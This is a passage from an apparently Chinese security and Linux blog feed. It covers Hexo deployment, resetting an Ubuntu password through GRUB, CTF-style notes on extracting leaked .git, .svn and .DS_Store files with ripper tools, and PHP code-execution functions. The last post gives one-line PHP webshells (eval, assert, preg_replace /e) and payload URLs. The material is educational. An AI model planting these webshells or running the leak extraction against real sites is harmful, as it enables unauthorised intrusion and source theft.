class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 全局安装hexo</span><br><span class="line">sudo npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">// 把必须拷贝的文件，拷贝到新建的文件夹内，执行以下命令</span><br><span class="line">// 在新建的文件夹内打开命令行，安装必要的模块，初始化</span><br><span class="line">// 这里不用hexo init初始化，因为配置文件我们已经拷贝过来(一定要慎重，严格按照教程来)</span><br><span class="line"></span><br><span class="line">sudo npm install</span><br><span class="line"></span><br><span class="line">// 安装其他一些必要的组件</span><br><span class="line">sudo npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">sudo npm install hexo-generator-feed --save</span><br><span class="line"></span><br><span class="line">sudo npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><h2 id="本地测试是否安装成功"><a href="#本地测试是否安装成功" class="headerlink" title="本地测试是否安装成功"></a>本地测试是否安装成功</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先本地预览</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line">//此时可以先在localhost:4000 本地预览博客，如果不报错，那就说明迁移成功</span><br></pre></td></tr></table></figure><h2 id="部署到github上"><a href="#部署到github上" class="headerlink" title="部署到github上"></a>部署到github上</h2><p>由于迁移的原因，本地的公钥私钥需要重新生存，请参考这篇文章<a href="https://www.jianshu.com/p/63edbb08bd5f" target="_blank" rel="noopener">Mac下Github的SSH公钥生成记录</a></p><p>然后测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 正式部署</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网上也有类似的教程，但是每次都要去上网查询怎么去配置，比较耗时。所以就自己记录下来，方便以后看。&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="https://xianyu123.me/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04忘记登录密码的解决办法（虚拟机下处理方法相同）</title>
    <link href="https://xianyu123.me/2019/04/28/Ubuntu16-04%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E5%BF%98%E8%AE%B0%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>https://xianyu123.me/2019/04/28/Ubuntu16-04（虚拟机）忘记登录密码的解决办法/</id>
    <published>2019-04-28T08:14:51.000Z</published>
    <updated>2019-05-11T12:52:58.625Z</updated>
    
    <content type="html"><![CDATA[<p>Ubuntu16.04（虚拟机）忘记登录密码的解决办法备忘录，防止下次忘记密码时不知道该怎么办</p><a id="more"></a><h2 id="1-重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图："><a href="#1-重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图：" class="headerlink" title="1. 重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图："></a>1. 重启ubuntu系统，开机时长按shift按键进入GRUB菜单，选择第二个高级选项。如下图：</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass1.png?imageslim" alt></p><h2 id="2-在高级选择中选择Recovery-mode模式，如果有多个，选择版本最高的那个，然后进入Recovery-mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键"><a href="#2-在高级选择中选择Recovery-mode模式，如果有多个，选择版本最高的那个，然后进入Recovery-mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键" class="headerlink" title="2. 在高级选择中选择Recovery mode模式，如果有多个，选择版本最高的那个，然后进入Recovery mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键"></a>2. 在高级选择中选择Recovery mode模式，如果有多个，选择版本最高的那个，然后进入Recovery mode模式。键盘按“e”键进入编辑模式。如下图，注意：不要先按enter键</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass4.png?imageslim" alt></p><h2 id="3-在编辑模式中通过上下键寻找到RO修改为RW模式-可写入恢复模式-。如下图，然后按crtl-X进入系统"><a href="#3-在编辑模式中通过上下键寻找到RO修改为RW模式-可写入恢复模式-。如下图，然后按crtl-X进入系统" class="headerlink" title="3. 在编辑模式中通过上下键寻找到RO修改为RW模式(可写入恢复模式)。如下图，然后按crtl+X进入系统"></a>3. 在编辑模式中通过上下键寻找到RO修改为RW模式(可写入恢复模式)。如下图，然后按crtl+X进入系统</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass2.jpg?imageslim" alt></p><h2 id="4-进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图："><a href="#4-进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图：" class="headerlink" title="4. 进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图："></a>4. 进行系统BIOS界面，通过上下键选择root命令行，点击enter键，如下图：</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass5.png?imageslim" alt></p><h2 id="5-然后再按回车，进入shell交互模式，输入命令passwd-username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可"><a href="#5-然后再按回车，进入shell交互模式，输入命令passwd-username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可" class="headerlink" title="5. 然后再按回车，进入shell交互模式，输入命令passwd username（username为用户，比如我的用户名为xianyu123），然后回车，输入新密码和重复新密码即可"></a>5. 然后再按回车，进入shell交互模式，输入命令<code>passwd username</code>（<code>username</code>为用户，比如我的用户名为<code>xianyu123</code>），然后回车，输入新密码和重复新密码即可</h2><p><img src="http://images.xianyu123.club/ubuntu_forget_pass3.jpg?imageslim" alt></p><h2 id="6-输入sudo-reboot，然后就可以使用新密码登录了"><a href="#6-输入sudo-reboot，然后就可以使用新密码登录了" class="headerlink" title="6. 输入sudo reboot，然后就可以使用新密码登录了"></a>6. 输入sudo reboot，然后就可以使用新密码登录了</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/cnkemi/p/6066441.html" target="_blank" rel="noopener">Ubuntn系统忘记密码的解决方法（虚拟机下同样处理）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ubuntu16.04（虚拟机）忘记登录密码的解决办法备忘录，防止下次忘记密码时不知道该怎么办&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://xianyu123.me/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>web常见源码泄露</title>
    <link href="https://xianyu123.me/2019/04/17/web%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>https://xianyu123.me/2019/04/17/web常见源码泄露/</id>
    <published>2019-04-17T08:24:02.000Z</published>
    <updated>2019-05-22T02:06:44.182Z</updated>
    
    <content type="html"><![CDATA[<p>web常见源码泄露备忘录</p><a id="more"></a><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>网上已经有非常多的资料了，写本文主要是经常在CTF中和web渗透测试时遇到，所以当作自己的备忘录记录一下</p><h1 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h1><h2 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h2><p><code>hg</code>是类似于<code>git</code>的一种分布式管理</p><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p><code>hg init</code>的时候会生成<code>.hg</code>（初始化）</p><h3 id="fuzz："><a href="#fuzz：" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.hg/</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.hg</span><br></pre></td></tr></table></figure><h2 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h2><h3 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>在运行<code>git init</code>初始化代码库的时候，会在当前目录下面产生一个<code>.git</code>的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把<code>.git</code>这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><h3 id="fuzz：-1"><a href="#fuzz：-1" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.git/config</span></span><br></pre></td></tr></table></figure><p>存在该页面，可以看到配置信息，说明存在该漏洞</p><h3 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/</span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://url/.git</span><br></pre></td></tr></table></figure><h2 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h2><h3 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>在发布代码时未删除文件夹中隐藏的<code>.DS_store</code></p><h3 id="fuzz：-2"><a href="#fuzz：-2" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.DS_Store</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://url/.DS_Store</span><br></pre></td></tr></table></figure><h2 id="编辑器文件泄露"><a href="#编辑器文件泄露" class="headerlink" title="编辑器文件泄露"></a>编辑器文件泄露</h2><h3 id="vim文件泄露"><a href="#vim文件泄露" class="headerlink" title="vim文件泄露"></a>vim文件泄露</h3><p>非正常关闭vim编辑器（直接关闭终端、电脑断电等），都会生成一个用于备份缓冲区内容的临时文件<code>.swp</code>文件。它记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。并且多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p><p>例如第一次产生一个<code>.test.txt.swp</code>，再次意外退出后，将会产生名为<code>.test.txt.swo</code>的交换文件；而第三次产生的交换文件则为<code>.test.txt.swn</code>依此类推。</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带<code>~</code>的备份文件，某些情况下可以对其下载进行查看</p><p>例如：<br><code>index.php</code>的备份文件则为<code>index.php~</code></p><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>使用<code>phpstorm</code>新建项目时，会生成一个<code>.idea`</code>文件夹，这个文件夹有一个workspace.xml`，访问可以得到一些信息。</p><h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>漏洞成因及危害:</strong></p><p>该漏洞的成因主要有以下两种：</p><ol><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ol><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><h3 id="fuzz：-3"><a href="#fuzz：-3" class="headerlink" title="fuzz："></a>fuzz：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.svn/entries</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<code>web.xml</code>文件对要访问的文件进行相应映射才能访问。</p><h3 id="漏洞成因：-3"><a href="#漏洞成因：-3" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致<code>web.xml</code>等文件能够被读取。</p><h3 id="WEB-INF主要包含一下文件或目录："><a href="#WEB-INF主要包含一下文件或目录：" class="headerlink" title="WEB-INF主要包含一下文件或目录："></a>WEB-INF主要包含一下文件或目录：</h3><ul><li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li><code>/WEB-INF/classes/</code>：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li><code>/WEB-INF/lib/</code>：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个java文件。</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件</li></ul><h3 id="漏洞利用：-4"><a href="#漏洞利用：-4" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p>浏览器直接读取，推断<code>class</code>文件的路径，最后直接<code>class</code>文件，在通过反编译<code>class</code>文件，得到网站源码。一般情况，<code>jsp</code>引擎默认都是禁止访问<code>WEB-INF</code>目录的</p><h2 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h2><h3 id="fuzz-1"><a href="#fuzz-1" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>取回源码的命令，这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h2 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h2><h3 id="漏洞利用：-5"><a href="#漏洞利用：-5" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://url/.bzr/</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">文件泄露</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">常见Web源码泄露解析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;web常见源码泄露备忘录&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php代码执行与命令执行漏洞</title>
    <link href="https://xianyu123.me/2019/04/15/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://xianyu123.me/2019/04/15/php代码执行与命令执行漏洞/</id>
    <published>2019-04-15T13:17:12.000Z</published>
    <updated>2019-05-11T12:52:58.624Z</updated>
    
    <content type="html"><![CDATA[<p>php代码执行与命令执行漏洞</p><p>学习php代码执行与命令执行漏洞，没有新姿势</p><a id="more"></a><h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed <span class="keyword">eval</span>( string $code)</span><br></pre></td></tr></table></figure><p><code>eval()</code>函数把字符串按照php代码来计算，常见的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>得到phpinfo()页面。</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, string $description] )</span><br></pre></td></tr></table></figure><p>php7：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, Throwable $exception] )</span><br></pre></td></tr></table></figure><p><strong>assert()</strong> 会检查指定的    <code>assertion</code> 并在结果为 <strong>FALSE</strong> 时采取适当的行动。</p><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p><p>普通调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>后可以不用分号，得到phpinfo页面。</p><p>assert函数支持动态调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a($_POST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</strong></p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = <span class="number">-1</span>[, int &amp;$count]] )</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code>在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为php代码评估执行(<code>eval</code>函数方式)，并使用执行结果作为实际参与替换的字符串。单引号、双引号、反斜线()和 NULL 字符在后向引用替换时会被用反斜线转义.</p><h4 id="第一个参数"><a href="#第一个参数" class="headerlink" title="第一个参数"></a>第一个参数</h4><!--还没写过，有空补充--><h4 id="第二个参数"><a href="#第二个参数" class="headerlink" title="第二个参数"></a>第二个参数</h4><p>一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">"/123/e"</span>,$_REQUEST[<span class="string">'cmd'</span>],<span class="string">"1234"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>php 7.0.0  不再支持  <em>/e</em>修饰符</p><p>更详细说明请参考文档：<a href="http://php.net/preg_replace" target="_blank" rel="noopener">php-preg_replace</a></p><h4 id="第三个参数"><a href="#第三个参数" class="headerlink" title="第三个参数"></a>第三个参数</h4><!--还没写过，有空补充--><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function( string $args, string $code)</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$fname'</span>,<span class="string">'echo $fname."Zhang"'</span>)</span><br></pre></td></tr></table></figure><p>类似于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($fname)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> $fname.<span class="string">"Zhang"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</span><br><span class="line">$b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>该函数存在缺陷，详见<a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )</span><br></pre></td></tr></table></figure><p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。 传入<code>call_user_func()</code>的参数不能为引用传递。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec=phpinfo()</span><br></pre></td></tr></table></figure><p><code>eval()</code>在这里是不能作为回调函数使用的。</p><p>在php中，可以通过<code>is_callable</code>来判断一个函数是否为回调函数，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_callable(<span class="string">"eval"</span>) == <span class="keyword">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr)</span><br></pre></td></tr></table></figure><p> 把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func_array($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec[]=phpinfo()</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] )</span><br></pre></td></tr></table></figure><p>返回数组，是为 <code>array1</code> 每个元素应用 <code>callback</code>函数之后的数组。<code>callback</code> 函数形参的数量和传给 <strong>array_map()</strong> 数组数量，两者必须一样。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 